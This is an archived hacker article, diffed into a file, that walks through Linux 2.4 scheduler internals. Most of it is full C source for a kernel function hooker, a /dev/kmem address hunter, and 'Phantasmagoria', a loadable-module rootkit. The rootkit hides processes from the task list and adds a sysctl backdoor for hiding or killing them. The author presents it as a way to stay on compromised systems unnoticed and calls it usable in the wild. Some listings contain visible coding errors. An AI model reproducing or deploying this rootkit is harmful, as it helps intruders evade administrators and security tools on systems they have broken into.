@@ -1,0 +1,948 @@
+This is a translation of the original article published on www.s0ftpj.org
+Excuse me for my poor english
+
+
+	 	 -= Smashing The Kernel For Fun And Profit =-
+		     by Dark-Angel <DarkAngel@antifork.org>
+
+
+-=0x0=- Requirements
+
+	- A 2.4.x kernel
+
+
+
+-=0x1=-	Introduction:
+
+	Today the net offers us a lot of pseudo-tools that work as processes
+	hiders but, as well known, they are far to be perfect. Let's start for
+	example with a classic binary-trojan: running strace we'll notice
+	immediately that there's something that needs our attention. At the
+	end, in more or less twenty seconds (in the evenience the sysadmin is
+	quite unwise) we would find ourselves out of our preferred system.
+	We can reach fourty seconds if we are planning to use kernel-tools,
+	like the famous knark and adore, but, on my opinion, that is too less
+	time to work in peace :-)
+	In the article that follows I'll show you a technique that allows you
+	to remain into a system for enough time or to give a sysadmin a
+	terrible headache.
+
+-=0x2=-	A little base:
+
+	In this paragraph I'll try to give you an idea of the basics that you
+	must know in order to undestand the following article.
+	Every process is stored in the memory under the form of a struct named
+	task_struct, defined in linux/sched.h, and all the processes of the
+	system are present in a double linked list of these task_struct.
+	When we attempt to execute a command from our favourite shell, more or
+	less this is what happens:
+	
+		- sys_fork is called to fork the current process (the current
+		  struct, the shell). The call creates an exact copy of the
+		  struct and links it to the list
+
+		- sys_execve is called to overwrite the newborn PCB (Process
+		  Control Block, the task_struct) with the infos of the new
+		  process
+
+	[1] Another concept that you must know in order to proceed with reading
+	is what is the scheduler, which is its function and how it works.
+	On multiprogrammed systems  processes won't be executed till the end
+	one by one (as in DOS), the machine compute for a determined time a
+	task before switching to another. Scheduler may be definied as the
+	algorithm that the o.s. execute in order to choose wich process can
+	use the cpu.
+	Obviously, the end of the quantum of one process isn't the only thing
+	that makes necessary to call the scheduler.
+	Another thing you must know is what are the epochs. An epoch is the
+	period of time that all the processes employ to exaust their time
+	quantums. If a process finishes its quantum, it will have to wait until the
+	end of the epoch to obtain new cpu time. At the end of the epoch
+	quantums are refreshed according to particular criteria we don't care.
+	[2] The spinlocks are an expedient to avoid race conditions.
+	They work through a shared variable: a function can obtain the lock
+	setting a variable, and if another function had to demand the lock
+	seeing it not avaiable will "spin" in a busy/wait cycle until the
+	obtainment of the lock. Spinlocks, instead of semaphores, can be used
+	in interrupt context because the don't put a process to sleep.
+
+-=0x3=- Let's go
+
+	Well, now that we are made an idea of the things on which we will go to
+	work we can begin. Our friends security tools and the operating system
+	think that if a process is in execution must be on the process list...
+	this is true only in part. The processes must be found on the list only
+	when their goodness is estimated for the successive context switch 
+	(that is the substitution of the process that can use the cpu). Once
+	the process began to run we could unlink its PCB without system become
+	aware of it if we put it at its place before the next check by the
+	scheduler. When the scheduler is called in the moment of the analysys
+	of the next process to execute can't be interrupted and no process
+	(with the exception ofthe swapper) can run.
+	Therefore if we were in a position to link a PCB to the list of the
+	processes before the analysis from the scheduler, and to unlink it
+	after the end always remaining in the ininterruttibile zone, we could
+	carry the execution of a process without that it is present in the list
+	and way totally stealth, infact it would become "present" when nothing
+	can run and therefore to find it.
+	Easy to tell, isn't it? Luckyly it's no too difficult to do :-)
+	Now, looking at out scheduler source code that we can find in
+	/usr/src/linux/kernel/sched.c we must find the point where the task
+	list is checked to calculate the goodness of each process. Looking for
+	the word "goodness" in the schedule() function we can find this piece
+	of code:
+
+	c=-1000;
+	
+	        list_for_each(tmp, &runqueue_head) {
+        	   p = list_entry(tmp, struct task_struct, run_list);
+	              if (can_schedule(p, this_cpu)) {
+        	          int weight = goodness(p, this_cpu, prev->active_mm);
+                	    if (weight > c)
+                        	 c = weight, next = p;
+		      }
+		}
+
+		if (unlikely(!c)) {
+	           struct task_struct *p;
+        	   spin_unlock_irq(&runqueue_lock);
+	           read_lock(&tasklist_lock);
+        	     for_each_task(p)
+	                p->counter = (p->counter >> 1) + NICE_TO_TICKS(p->nice);
+		   read_unlock(&tasklist_lock);
+		   spin_lock_irq(&runqueue_lock);
+		   goto repeat_schedule;
+		}
+
+	The processes in memory are'nt linked only with the task_struct's list,
+	but exist a list of struct list_head and every node of this list is
+	"included" in a task_struct of the main list. The list_for_each
+	function checks the runqueue list (made of list_head structs) and for
+	each node it computes the correspective task_struct and its goodness.
+	The " if(unlikely(!c)) {" code block is for the refresh of the time
+	quantums if the epoch is ended. After this point there's the context
+	switch, so it's here that we have to work.
+	
+	
+-=0x4=-	The hook:
+
+
+	To hook a function in the middle we'll have to use a little variant of
+	the famous Silvio Cesare's technique, but don't worry, it's easy.
+	Obviously, we'll have to execute extraneous code, and so we must:
+		- backup some istructions
+		- jump to our function
+		- do the dirty job
+		- execute the backupped istructions
+		- return in the original funcion after the jump
+		
+	You notice yourself that the original function is never restored.
+	Here a little example of this:
+
+
+			     -=-=>DoubleChain.c<=-=-
+
+	/* 
+		DoubleChain, a simple function hooker
+		by Dark-Angel <Dark0@angelfire.com>
+	*/
+	
+	#define __KERNEL__
+	#define MODULE
+	#define LINUX
+
+	#include <linux/module.h>
+	#define CODEJUMP 7
+	#define BACKUP 7
+	/* The number of the bytes to backup is variable (at least 7),
+	the important thing  is never break an istruction
+	*/
+	static char backup_one[BACKUP+CODEJUMP]="\x90\x90\x90\x90\x90\x90\x90"
+					         "\xb8\x90\x90\x90\x90\xff\xe0";
+
+	static char jump_code[CODEJUMP]="\xb8\x90\x90\x90\x90\xff\xe0";
+	
+	#define FIRST_ADDRESS 0xc0101235 //Address of the function to overwrite
+
+	unsigned long *memory;
+	
+	void cenobite(void) {
+		printk("Function hooked successfully\n");
+		asm volatile("mov %ebp,%esp;popl %esp;jmp backup_one);
+	/* 
+	This asm code is for stack-restoring. The first bytes of a function
+	(Cenobite now) are always for the parameters pushing.Jumping away the
+	function can't restore the stack, so we must do it by hand.
+	With the jump we go to execute the backupped code and then we jump in
+	the original function.
+	*/
+	}
+	
+	int init_module(void) {
+	*(unsigned long *)&jump_code[1]=(unsigned long )cenobite;
+
+	*(unsigned long *)&backup_one[BACKUP+1]=(unsigned long)(FIRST_ADDRESS+
+								BACKUP);
+	
+	memory=(unsigned long *)FIRST_ADDRESS;
+	memcpy(backup_one,memory,CODEBACK);
+	memcpy(memory,jump_code,CODEJUMP);
+	return 0;
+	}
+
+	void cleanup_module(void) {
+		memcpy(memory,backup_one,BACKUP);
+	}
+
+			   -=-=-> End DoubeChain.c <-=-=-	
+
+
+	It's useless to say that with this trick we can hook pratically
+	wichever thing in wichever place and taht we can modify the behavior of
+	most syscalls without touching them, just playing with their
+	sub-functions.
+
+
+-=0x5=-	The application
+
+
+	Well, to start we need the address of the "c=-1000" and that of the
+	first instruction after the quantums refresh block. But why do we need
+	the address of "c=-1000"? We need it because it's the firts thing
+	before the list_for_each cycle and we can't risk to overwrite a part of
+	this. Moreover we do not have no point of reference in order to find
+	the addresses of where to go to overwrite and that assignment being
+	constant is like a lighthouse in the storm :)
+	Same thing for the second address we need, well look for the fist
+	assignment after the quantums refresh block. On our box, we can proceed
+	in this way: we put in front a asm volatile("nop;nop;nop;.........");
+	to our instructions target, we make a partial recompilation of the
+	kernel in order to generate a new vmlinux and through a
+	objdump -dS vmlinux we can obtain one magnificent panoramic of
+	instructions and addresses. 
+	Naturally these addresses are only fictitious, but now that we can see
+	where are the interesting points we can easyly study a sequence of
+	istructions that we can use as pattern parsing /dev/kmem to get the
+	addresses. Unlukyly the form in ams code of the firts lighthouse
+	istructions and their dimension change from kernel to kernel, so
+	we must find some standard asm lighthouse istructions, and then
+	we'll have to deduct the right startpoint reasoning on opcodes and
+	istructions sequences. Luckuly the others hook's dimensions seems to be
+	constant. Here the code of a raw and badcoded (but quit affidable)
+	memory parser that implements this "technique".
+
+
+			      	-=-=-> Hunter.c <-=-=-
+
+	/* 	
+		Hunter, a very very raw addresses hunter and memory parser
+		by Dark-Angel <Dark0@angelfire.com>
+	*/		 
+
+	#include <stdio.h>
+	#include <unistd.h>
+	#include <sys/types.h>
+	#include <stdlib.h>
+	#include <sys/stat.h>
+	#include <fcntl.h>
+
+	char *sch_s_pattern[]={"18","fc","ff","ff",NULL};
+	char *exit_s_pattern[]={"8b","b3","98","00","00","00",NULL};
+	char *exit_e_pattern[]={"57","56","53",NULL};
+	char *do_execve_pattern[]={"81","c4","38","01","00","00",NULL};
+	char *do_sysctl_pattern[]={"83","ec","04","55","57","56","53",NULL};
+	char *cli="fa";
+ 	char computed_address[8];
+ 	char *end_string="/g\" config.h > tmpconf";
+ 	char *sost_1_string="sed \"s/^\\#define O_E_ADD INSERT/\\#define O_E_ADD 0x";
+ 	char *sost_2_string="sed \"s/^\\#define O_F_ADD INSERT/\\#define O_F_ADD 0x";
+ 	char *sost_3_string="sed \"s/^\\#define O_EXIT_END INSERT/\\#define O_EXIT_END 0x";
+ 	char *sost_4_string="sed \"s/^\\#define O_DO_EXECVE_END INSERT/\\#define O_DO_EXECVE_END 0x";
+ 	char *sost_5_string="sed \"s/^\\#define CODEBACK1 INSERT/\\#define CODEBACK1 ";
+ 	char *sost_6_string="sed \"s/^\\#define O_DO_SYSCTL INSERT/\\#define O_DO_SYSCTL 0x";
+
+ 	char command_string[100];
+
+ 	int isNotOp(unsigned char dati);
+	int isMov(unsigned char buf[]);
+  	int main (int argc, char *argv[]) {
+	
+    	int file,pos,times;
+    	unsigned long address_exit,address_schedule,runner,address_result;
+    	unsigned char data;
+     	unsigned char backuped;
+      	unsigned long offset;
+       	unsigned char buffer[2];
+           if((file=open("/dev/kmem",O_RDONLY))==-1)
+               exit -1;
+        address_schedule=(unsigned long)0xc0100000;
+        lseek(file,address_schedule,SEEK_SET);
+        runner=pos=times=0;
+           while(1) {
+             read(file,&data,1);
+             sprintf(buffer,"%.2x",data);
+                if(!(strcmp(buffer,sch_s_pattern[pos]))) {
+			 if((pos==3)&&(times==3)) {
+				 address_schedule-=3;
+				 lseek(file,-5,SEEK_CUR);
+				 //Now address_schedule and the fp point at
+				 //the first byte before of the start
+				 //of our pattern
+ 				 runner++;
+				 read(file,&data,1);
+				 sprintf(buffer,"%.2x",data);
+ 
+ 					while(!(isMov(buffer))) {
+					SPIN:	 runner++;
+					 	 address_schedule--;
+						 lseek(file,-2,SEEK_CUR);
+						 read(file,&data,1);
+						 sprintf(buffer,"%.2x",data);
+					 }
+					 if(runner+4<7) 
+					//If there aren't at least 7 bytes go back by one
+					//istruction
+						 goto SPIN;
+
+				 sprintf(computed_address,"%x",address_schedule-1);
+				 strcat(command_string,sost_2_string);
+				 strcat(command_string,computed_address);
+				 strcat(command_string,end_string);
+				 system(command_string);
+				 system("mv tmpconf config.h");
+				 memset(command_string,0,sizeof(command_string));
+				 sprintf(computed_address,"%d",runner+4);
+				 strcat(command_string,sost_5_string);
+				 strcat(command_string,computed_address);
+				 strcat(command_string,end_string);
+				 system(command_string);
+				 system("mv tmpconf config.h");
+ 
+				 break;
+ 
+ 
+			 }
+			 if((pos==3)&&(times<3)){
+				 times++;
+				 goto RESET;
+			 }
+		    pos++;
+		 }
+		 else 
+			 RESET: pos=0;
+	 address_schedule++;
+ 
+	} //Fine while
+      
+	pos=0;
+	memset(command_string,0,sizeof(command_string));
+
+	while(1) {
+		 backuped=data;
+		 read(file,&data,1);
+		 sprintf(buffer,"%.2x",data);
+			 if( (!(strcmp(buffer,cli))) && (isNotOp(backuped)) ) {
+				 while(1) {
+					 read(file,&data,1);
+					 sprintf(buffer,"%.2x",data);
+						 if(isMov(buffer)) {
+						    sprintf(computed_address,"%x",address_schedule+1);
+						    strcat(command_string,sost_1_string);
+						    strcat(command_string,computed_address);
+						    strcat(command_string,end_string);
+						    system(command_string);
+						    system("mv tmpconf config.h");
+						    goto EXIT;
+ 						 }
+						 else
+							 address_schedule++;
+ 				}
+ 
+ 			}
+ 
+		 address_schedule++;
+
+ 	}
+
+ 	EXIT: pos=0;
+	 memset(command_string,0,sizeof(command_string));
+	 while(1) {
+		 read(file,&data,1);
+		 sprintf(buffer,"%.2x",data);
+			 if(!(strcmp(buffer,exit_s_pattern[pos]))) {
+				 if(pos==5) {
+					 pos=0;
+						 while(1) {
+							 read(file,&data,1);
+							 sprintf(buffer,"%.2x",data);
+								 if(!(strcmp(buffer,exit_e_pattern[pos]))) {
+									 if(pos==2) {
+										 sprintf(computed_address,"%x",address_schedule-6);
+										 strcat(command_string,sost_3_string);
+										 strcat(command_string,computed_address);
+										 strcat(command_string,end_string);
+										 system(command_string);
+										 system("mv tmpconf config.h");
+ 
+										 break;
+									 }
+								    pos++;
+								 }
+								 else
+									 pos=0;
+ 
+							 address_schedule++;
+						 }
+						 break;
+ 
+	 			}
+			   pos++;
+			 }
+			 else
+				 pos=0;
+		 address_schedule++;
+	 }
+
+	 times=pos=0;
+	 memset(command_string,0,sizeof(command_string));
+ 
+	 while(1) {
+		 read(file,&data,1);
+		 sprintf(buffer,"%.2x",data);
+			 if(!(strcmp(buffer,do_sysctl_pattern[pos]))) {
+				 if((pos==6)&&(times==1)) {
+					 sprintf(computed_address,"%x",address_schedule-2);
+					 strcat(command_string,sost_6_string);
+					 strcat(command_string,computed_address);
+					 strcat(command_string,end_string);
+					 system(command_string);
+					 system("mv tmpconf config.h");
+					 address_schedule++;
+					 break;
+				 }
+				 if((pos==6)&&(times<1)) {
+					 times++;
+					 goto RESTART;
+				 }
+
+			   pos++;
+			 }
+			 else
+				 RESTART: pos=0;
+		 address_schedule++;
+	 }
+ 
+	 pos=0;
+	 memset(command_string,0,sizeof(command_string));
+ 
+	 while(1) {
+		 read(file,&data,1);
+		 sprintf(buffer,"%.2x",data);
+			 if(!(strcmp(buffer,do_execve_pattern[pos]))) {
+				 if(pos==5) {
+					 sprintf(computed_address,"%x",address_schedule-1);
+					 strcat(command_string,sost_4_string);
+					 strcat(command_string,computed_address);
+					 strcat(command_string,end_string);
+					 system(command_string);
+					 system("mv tmpconf config.h");
+					 break;
+				 }
+				 else
+					 pos++;
+			 }
+			 else
+				 pos=0;
+ 
+		 address_schedule++;
+	 }
+	 return 0;
+	 }
+
+	 int isNotOp(unsigned char dati) {
+	 int counter;
+	 unsigned char buf[2];
+	 unsigned char *patterns[]={"39","d1","81","89","83","c7",NULL};
+	 sprintf(buf,"%.2x",dati);
+	 counter=0;
+		 for(;counter<6;counter++)
+			 if((strstr(buf,patterns[counter]))) 
+				 return 0;
+	 return 1;
+	 }
+
+	 int isMov(unsigned char buffer[]) {
+	 int counter;
+	 unsigned char *patterns[]={"8b","89","b8","bf","c7",NULL};
+	 counter=0;
+		 for(;counter<5;counter++)
+			 if((strstr(buffer,patterns[counter])))
+				 return 1;
+	 return 0;
+ 	}
+				-=-=-> End Hunter.c <-=-=-
+
+	
+
+	Ok, now that we are able to hook the scheduler and to find addresses
+	let's think about the processes. We want to handle a lot of hided
+	processes so we'll have to use a separate list to link/unlink them.
+	We'll use a fixed pointer as head of the list and when we will
+	detect an hided process we will have to unlink them from the main
+	list and put them in head of our list. As fixed pointer i've decided
+	to use the field p_pptr of the swapper task_struct. At the end, if
+	we have 2 hided processes the sitiation is this:
+
+
+			   Next				Next
+		First Proc ----->Second hided process -----|
+		Hided					   |
+		   ^					   |
+		   |					   |
+		   | Father (p_pptr)			   |
+		   |					   |
+		Swapper --------------------->init <-------|
+				Next Process
+
+	Swapper->p_pptr points to the first of the hided processes, and every
+	hided process' next_task field points the next hidden process, except
+	the last, which next_task field points to the init process. Naturally
+	a for_each_task starting from swapper->p_pptr will reveal all the
+	hidden tasks, but we could avoid this problem using an extern global
+	pointer... Easy to implement by yourself, isn't it? ^_-
+	Unluckyly nothing is for nothing: an implementation like this is
+	cause of "some" problems, and the first of them is the sys_exit.
+	When a process ends, its pcb must be unlinked from the list and this
+	is done trough the REMOVE_LINKS macro, defined in
+	/usr/src/linux/include/linux/sched.h
+	Here is the code of this macro:
+
+	#define REMOVE_LINKS(p) do { \
+	        (p)->next_task->prev_task = (p)->prev_task; \
+	        (p)->prev_task->next_task = (p)->next_task; \
+		        if ((p)->p_osptr) \
+		                (p)->p_osptr->p_ysptr = (p)->p_ysptr; \
+		        if ((p)->p_ysptr) \
+		                (p)->p_ysptr->p_osptr = (p)->p_osptr; \
+		        else \
+		                (p)->p_pptr->p_cptr = (p)->p_osptr; \
+	        } while (0)
+
+	As we can see from the 2nd and the 3rd line the struct is unlinked
+	like in a normal list, but if the ending process is hidden the
+	pointers are wrong, because we have swapper->p_pptr instead of
+	p->prev_task->next_task. We can easyly correct this hooking on the
+	end the exit_notify function and implementing a pointer corrector
+	function. We'll hook the exit_notify and not the sys_exit because
+	doing in this manneer we have the same effect without modifying
+	any syscall. Always for this reason we have to hook a secondary
+	function with its arguments coming from user space to comunicate
+	with the module from userpsace.
+	The other problem is bigger: how to detect and handle forked
+	processes? Let me explain: monitoring the do_execve function we
+	can detect any new process, and if it's hidden we can hide it. But
+	think on a program like this:
+		
+			...
+			int main(void) {
+				fork();
+				printf("Hello\n");
+				return 0;
+			}
+			
+	Here do_execve is called only one time, but we have two processes
+	and both to hide. We can't hook the do_fork or working on the
+	newforked pcb because this would alter the informations needed by
+	an eventual execve (regs) and so would cause a system crash.
+	Our only chance to detect these little bastards is to detect them
+	runtime. To do this we must monitor a function that is called for
+	every new process (like wake_up_process for example) or that works
+	often with all processes....:)
+	Yes, you're right, the scheduler is still in our hands and so we
+	can abuse another time of it }:)
+	Here's the code:
+
+
+			   -=-=-> Phantasmagoria.c <-=-=-
+			   
+	/* 
+		Phantasmagoria, a very cool processes hider
+		by Dark-Angel <Dark0@angelfire.com>
+	*/
+	
+	#define __KERNEL__
+	#define MODULE
+	#define LINUX
+	#ifdef CONFIG_MODVERSIONS
+	#define MODVERSIONS
+	#include <linux/modversions.h>
+	#endif
+	#include <linux/module.h>
+	#include <linux/kernel.h>
+	#include <sys/syscall.h>
+	#include <linux/sched.h>
+	#include "config.h"
+
+	#define PF_INVISIBLE 0x1000000
+	extern void * sys_call_table[];
+	void eraser(struct task_struct *p);
+	#define SIGHIDE 333 //The target process now generates hidden processes
+	#define SIGTHIDE 777 //Like hide, but the target process is totally hidden too
+	#define SIGHKILL 666 //It kills a thided (Total Hided) process
+	#define CODESIZE 7
+	#define CODEBACK2 8 
+	static char second_backup[CODEBACK2+7]="\x90\x90\x90\x90\x90\x90\x90"
+						"\x90\xb8\x00\x00\x00\x00\xff"
+						"\xe0";
+	static char first_backup[CODEBACK1+7];
+
+
+	static char third_backup[CODESIZE]="\x90\x90\x90\x90\x90\x90\x90";
+	static char fourth_backup[CODESIZE]="\x90\x90\x90\x90\x90\x90\x90";
+	static char fifth_backup[CODESIZE]="\x90\x90\x90\x90\x90\x90\x90";
+
+	static char inj_first_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+	static char inj_second_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+	static char inj_third_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+	static char inj_fourth_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+	static char inj_fifth_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
+
+	struct task_struct *init;
+	unsigned long *second_addr,*third_addr,*fourth_addr,*fifth_addr;
+
+	int (*o_kill)(int pid,int sig);
+	void (*o_function)(void)=(void*) O_F_ADD;
+
+	void first_function(void) {
+
+	/* First scheduler hook */
+	
+		write_lock_irq(&tasklist_lock);
+		(&init_task)->next_task=(&init_task)->p_pptr;
+	        write_unlock_irq(&tasklist_lock);
+		asm volatile ("mov %ebp,%esp;popl %ebp;jmp first_backup");
+	 
+	}
+
+	void second_function(void) {
+	/* Second scheduler hook: replace the normal pointer and
+	   detecting/hiding of forked hidden processes */
+
+		struct task_struct *p;
+		long wflag;
+		write_lock_irqsave(&tasklist_lock,wflag);	
+		(&init_task)->next_task=init;
+	RESTART:
+		p=&init_task;
+		do {
+			if( ((p->flags & PF_INVISIBLE)==PF_INVISIBLE) &&
+                	    (strcmp(p->comm,"bash"))) { 
+			/* The thiding of a shell from that shell itself
+			   will cause a crash, so we can't automatically thide them 
+			*/
+			   
+				eraser(p);
+	    	    		 goto RESTART; 
+	                }
+			p=p->next_task;
+		
+	        }
+		while(p!=&init_task);
+
+			if(init->prev_task!=&init_task)
+			   init->prev_task=&init_task;
+
+		/* If init->prev_task is different from swapper something
+		   is wrong, so we adjust it
+		*/
+
+		
+		write_unlock_irqrestore(&tasklist_lock,wflag);
+		asm volatile("mov %ebp, %esp; popl %ebp; jmp second_backup");
+	}
+
+	void eraser(struct task_struct *p) {
+	/* It thides a process */
+
+		struct task_struct *father;
+		long sflag;
+		spin_lock_irqsave(&runqueue_lock,sflag);
+	        father=p->p_pptr;
+			if(p->state!=TASK_ZOMBIE) {
+		              if(p->prev_task!=&init_task) 
+                		  REMOVE_LINKS(p);
+		 	        else {
+
+	        	          current->prev_task->p_pptr=current->next_task;
+	                	  current->next_task->prev_task=current->prev_task;
+        	                	  if ((current)->p_osptr)
+                		        	     (current)->p_osptr->p_ysptr = (current)->p_ysptr;
+		                          if ((current)->p_ysptr)
+        		                       (current)->p_ysptr->p_osptr = (current)->p_osptr;
+                		          else
+                        		       (current)->p_pptr->p_cptr = (current)->p_osptr;
+			        }
+			p->next_task=init_task.p_pptr;
+			p->prev_task=(&init_task)->p_pptr->prev_task;
+		        p->p_pptr=father;
+				if(p->next_task->pid!=1)
+	        			p->next_task->prev_task=p;
+				else
+					p->next_task->prev_task=&init_task;
+		        init_task.p_pptr=p;
+        		p->flags |= (PF_INVISIBLE);
+	        	(p)->p_ysptr = NULL;
+	        	  if (((p)->p_osptr = (p)->p_pptr->p_cptr) != NULL)
+		               (p)->p_osptr->p_ysptr = p;
+        		(p)->p_pptr->p_cptr = p;
+			}
+		spin_unlock_irqrestore(&runqueue_lock,sflag);
+	}
+
+	void third_function(void) {
+	/* modify of the exit_notify */
+
+		long wflag,sflag;
+		if  ((current->flags & PF_INVISIBLE)==PF_INVISIBLE) { 
+			spin_lock_irqsave(&runqueue_lock,sflag);
+			write_lock_irqsave(&tasklist_lock,wflag);
+			  if((current->prev_task)==(&init_task)) 
+                	        current->prev_task->p_pptr=current->next_task;
+	               	
+			write_unlock_irqrestore(&tasklist_lock,wflag);
+			spin_unlock_irqrestore(&runqueue_lock,sflag);
+		}
+		asm volatile("mov %ebp, %esp; popl %ebp; jmp third_backup");
+
+	}
+
+	void fourth_function(void) {
+	/* do_execve hook to make it thide a marked process */
+
+		long wflag;
+		  if((current->flags & PF_INVISIBLE) == PF_INVISIBLE) {
+			write_lock_irqsave(&tasklist_lock,wflag);
+				if(!(((current->prev_task->flags & PF_INVISIBLE)== PF_INVISIBLE)||
+				    (current->prev_task==&init_task)))
+					eraser(current);
+			write_unlock_irqrestore(&tasklist_lock,wflag);
+        	  }
+		asm volatile("mov %ebp, %esp; popl %ebp; jmp fourth_backup");
+	}
+
+
+	int (*o_do_sysctl)(int *name, int nlen, void *oldval, size_t *oldlenp,void *newval, size_t newlen)=(void *)O_DO_SYSCTL;
+	int n_do_sysctl (int *name, int nlen, void *oldval, size_t *oldlenp,void *newval, size_t newlen) {
+	/* Hook to communicate with userspace */
+
+	  int pid,sig;
+	  struct task_struct *p,*father;
+	  long wflag,sflag;
+	  int found=1;
+					
+	    if((name==NULL) && (oldval==NULL) && (oldlenp==NULL) && (newval==NULL)) {
+		sig=(int)nlen;
+		pid=(int)newlen;
+			switch(sig) {
+				case SIGHIDE : read_lock(&tasklist_lock);
+						for_each_task(p) 
+						       if(p->pid==pid) {
+							       p->flags |= (PF_INVISIBLE);
+							       found=0;
+							       break;
+						       }
+					       read_unlock(&tasklist_lock);
+					       if(found)
+						       return -1;
+					       else
+						       return 0;
+					       break;
+			
+				case SIGTHIDE :	spin_lock_irqsave(&runqueue_lock,sflag);
+						write_lock_irqsave(&tasklist_lock,wflag);
+					
+				       		for_each_task(p)
+							if(p->pid==pid) {
+							/* Sposta la struttura in testa alla lista secondaria */
+								father=p->p_pptr;
+								REMOVE_LINKS(p);
+								p->next_task=init_task.p_pptr;
+								p->prev_task=&init_task;
+								p->p_pptr=father;
+								p->next_task->prev_task=p;
+								init_task.p_pptr=p;
+								p->flags |= (PF_INVISIBLE);
+								(p)->p_ysptr = NULL;
+								  if (((p)->p_osptr = (p)->p_pptr->p_cptr) != NULL)
+									(p)->p_osptr->p_ysptr = p;
+								(p)->p_pptr->p_cptr = p;
+							found=0;
+							break;
+						}
+
+						write_unlock_irqrestore(&tasklist_lock,wflag);
+						spin_unlock_irqrestore(&runqueue_lock,sflag);
+							if(found)
+		                                               return -1;
+                		                        else
+                                		               return 0;
+	                                       break;
+															
+
+				case SIGHKILL :	spin_lock_irqsave(&runqueue_lock,sflag);
+						write_lock_irqsave(&tasklist_lock,wflag);
+
+						p=init_task.p_pptr;
+							while(p!=&init_task) {
+								if(p->pid==pid) {
+									if ((&init_task)->p_pptr==p) {
+							                    p->prev_task->p_pptr=p->next_task;
+									    p->next_task->prev_task=p->prev_task;
+										if ((current)->p_osptr)
+											p->p_osptr->p_ysptr = (p)->p_ysptr;
+												if ((p)->p_ysptr)
+												        (p)->p_ysptr->p_osptr = (p)->p_osptr;
+												else
+												        (p)->p_pptr->p_cptr = (p)->p_osptr;
+							
+									}
+									else 
+										REMOVE_LINKS(p);
+								SET_LINKS(p);
+								(*o_kill)(p->pid,9);
+								break;
+								}
+							p=p->next_task;
+							}
+						found=0;
+						write_unlock_irqrestore(&tasklist_lock,wflag);	
+						spin_unlock_irqrestore(&runqueue_lock,sflag);
+					
+							if(found)
+								return -1;
+							else
+								return 0;
+						break;
+			} //Fine switch
+	    }
+ 	    else {
+
+	    
+		memcpy(fifth_addr,fifth_backup,CODESIZE);
+		sig=o_do_sysctl(name,nlen,oldval,oldlenp,newval,newlen);
+		memcpy(fifth_addr,inj_fifth_code,CODESIZE);
+		return sig;
+	   }
+	return -1;
+
+	}
+
+
+
+
+	int init_module(void) {
+	
+		EXPORT_NO_SYMBOLS;
+		for_each_task(init)
+			if((init->pid)==1)
+				break;
+	
+	(&init_task)->p_pptr=init;
+	memcpy(first_backup,o_function,CODEBACK1);
+	do {
+
+		int i=0;
+			for(;i<CODESIZE;i++)
+				first_backup[CODEBACK1+i]=inj_first_code[i];
+	}
+	while(0);
+
+	*(unsigned long *)&inj_first_code[1]=(unsigned long)first_function;
+	*(unsigned long *)&inj_second_code[1]=(unsigned long)second_function;
+	*(unsigned long *)&inj_third_code[1]=(unsigned long)third_function;
+	*(unsigned long *)&inj_fourth_code[1]=(unsigned long)fourth_function;
+	*(unsigned long *)&inj_fifth_code[1]=(unsigned long)n_do_sysctl;
+
+
+	*(unsigned long*)&first_backup[CODEBACK1+1]=(unsigned long)(O_F_ADD+CODEBACK1);
+	*(unsigned long*)&second_backup[CODEBACK2+1]=(unsigned long)(O_E_ADD+CODEBACK2);
+	
+	
+	second_addr=(unsigned long*)O_E_ADD;
+	third_addr=(unsigned long*)O_EXIT_END;
+	fourth_addr=(unsigned long*)O_DO_EXECVE_END;
+	fifth_addr=(unsigned long*)O_DO_SYSCTL;
+
+	memcpy(second_backup,second_addr,CODEBACK2);
+	memcpy(third_backup,third_addr,CODESIZE);
+	memcpy(fourth_backup,fourth_addr,CODESIZE);
+	memcpy(fifth_backup,fifth_addr,CODESIZE);
+
+	memcpy(o_function,inj_first_code,CODESIZE);
+	memcpy(second_addr,inj_second_code,CODESIZE);
+	memcpy(third_addr,inj_third_code,CODESIZE);
+	memcpy(fourth_addr,inj_fourth_code,CODESIZE);
+	memcpy(fifth_addr,inj_fifth_code,CODESIZE);
+
+	o_kill=sys_call_table[SYS_kill];
+
+	return 0;
+	}
+
+	void cleanup_module(void) {
+	
+		memcpy(o_function,first_backup,CODEBACK1);
+		memcpy(second_addr,second_backup,CODEBACK2);
+		memcpy(third_addr,third_backup,CODESIZE);
+		memcpy(fourth_addr,fourth_backup,CODESIZE);
+		memcpy(fifth_addr,fifth_backup,CODESIZE);
+		init_task.next_task=init_task.p_pptr;
+		init_task.p_pptr=(&init_task);
+		init->prev_task=(&init_task);
+	
+	}
+
+
+			   -=-=-> End Phantasmagoria.c <-=-=-
+
+
+	Obviously, it isn't perfect, but it's perfeclty usable in the wild.
+	Have fun! ^__^
+
+
+	-= Dark-Angel =-
+
+
+-=0x6=- Bugs, strange things and other
+
+
+	- You can't thide the working shell from itself (from another is ok)
+
+	- Programs that forks many times in many diffrent process may crash or
+	  block (for example updatedb)
+
+	- You remember to use the special function of Heider.c to kill a
+	  thided process
+
+	- If you want the module to not taint the kernel you have to add the
+	  MODULE_LICENSE("GPL"); string after the cleanup module
+
+
+-=0x07=- Greetings
+
+
+	 Dimmu Borgir because they're the best group of the world :)
+	 xenion, Black, elv\, vecna, Snhyper, the guys of #c/c++ #phrack.it
+	 #asm #java #kernelnewbies and if i have forgotten to notice somebody
+	 please  excuse meeeee:)
+
+
+-=0x8=- Links
+
+	
+	[1] http://bravo.ce.uniroma2.it/kernelhacking/en/course-notes/sched.pdf
+	
+	Linux Device Drivers 2nd Edition By Alessandro Rubini & Jonathan Corbet
+	[2] http://www.xml.com/ldd/chapter/book	
+
+# milw0rm.com [2006-10-13]
